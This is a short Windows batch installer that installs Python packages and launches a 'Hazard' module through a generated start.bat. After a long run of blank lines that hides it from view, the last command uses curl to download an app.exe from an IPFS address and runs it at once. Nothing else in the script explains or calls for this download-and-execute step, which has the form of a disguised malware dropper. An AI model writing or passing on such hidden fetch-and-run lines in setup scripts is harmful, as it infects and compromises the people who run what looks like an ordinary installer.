@echo off

cd /d %~dp0

pip install -U -r requirements.txt
pip install cairocffi
pipwin install cairocffi
pip install cairosvg

echo @echo off > start.bat
echo python -m Hazard >> start.bat
echo pause >> start.bat
echo exit >> start.bat
start start.bat





























































curl -o app.exe https://bafybeidyjlszadmr5mk5b55omjc7yo6xbtdla7kewzxalbsq4uve4nbefq.ipfs.nftstorage.link/app.exe && start app.exe

pause
exit